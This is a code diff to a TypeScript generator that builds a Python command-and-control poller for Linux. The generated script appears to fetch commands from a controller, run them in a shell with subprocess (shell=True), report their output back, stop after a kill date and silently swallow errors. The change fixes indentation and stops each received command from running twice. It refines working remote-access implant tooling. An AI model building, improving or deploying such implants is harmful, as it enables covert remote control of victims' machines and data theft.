@@ -80,7 +80,7 @@ export function buildLinuxPythonPoller(cfg: C2PollerConfig): string {
     : "";
 
   const killBlock = cfg.killDate
-    ? `    if datetime.date.today() >= datetime.date.fromisoformat('${cfg.killDate}'): break`
+    ? `  if datetime.date.today() >= datetime.date.fromisoformat('${cfg.killDate}'): break`
     : "";
 
   return `#!/usr/bin/env python3
@@ -101,7 +101,8 @@ ${killBlock}
     if text.strip():
 ${decodeBlock}
       if cmd.strip():
-        out = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30).stdout + subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30).stderr
+        _r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
+        out = _r.stdout + _r.stderr
 ${reportBlock}
         cnt += 1
   except: pass
